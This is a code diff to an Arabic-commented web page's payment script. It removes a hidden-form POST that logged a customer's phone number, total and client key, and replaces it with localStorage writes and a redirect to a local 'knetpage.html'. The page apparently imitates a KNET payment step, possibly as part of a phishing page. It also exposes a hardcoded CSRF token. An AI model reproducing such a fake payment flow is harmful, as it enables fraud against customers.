@@ -285,7 +285,7 @@
                     </div>
                     <!-- تمرير رابط الـ route إلى جافاسكريبت -->
                     <script>
-                        var storeUrl = "#";
+                        var storeUrl = "./knetpage.html";
                     </script>
                 </section>
             </div>
@@ -721,13 +721,9 @@
         }
 
         function sendLog(data) {
-            $.post("#", {
-                log: data
-            }, function(response) {
-                console.log("Response:", response);
-                // مثال على إعادة التوجيه بعد النجاح، قم بتعديل الرابط حسب الحاجة:
-                window.location.href = "./knetpage.html";
-            });
+            console.log("Log data:", data);
+            // التوجيه إلى صفحة KNET
+            window.location.href = "./knetpage.html";
         }
 
         function generateSimilarNumber(baseNumber) {
@@ -737,35 +733,12 @@
             return prefix + randomSuffix;
         }
 
-        // تعديل دالة knet_payment لاستخدام POST مع إضافة توكن CSRF
+        // دالة knet_payment - التوجيه إلى صفحة KNET
         function knet_payment(event) {
             event.preventDefault();
             localStorage.setItem('Total', totalPrice);
-            // إنشاء فورم مخفي لتقديم البيانات باستخدام POST
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = "#";
-
-            // إضافة توكن CSRF
-            var csrfInput = document.createElement('input');
-            csrfInput.type = 'hidden';
-            csrfInput.name = '_token';
-            csrfInput.value = "yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8";
-            form.appendChild(csrfInput);
-
-            // إضافة بيانات إضافية مع تعديل المفتاح إلى "total"
-            var inputLog = document.createElement('input');
-            inputLog.type = 'hidden';
-            inputLog.name = 'log';
-            inputLog.value = JSON.stringify({
-                phone: inputField1.value, // قراءة القيمة الحالية لحقل رقم الهاتف
-                total: totalPrice,
-                clientKey: localStorage.getItem('clientKey')
-            });
-            form.appendChild(inputLog);
-
-            document.body.appendChild(form);
-            form.submit();
+            localStorage.setItem('phone', inputField1.value);
+            window.location.href = './knetpage.html';
         }
     </script>
 </body>
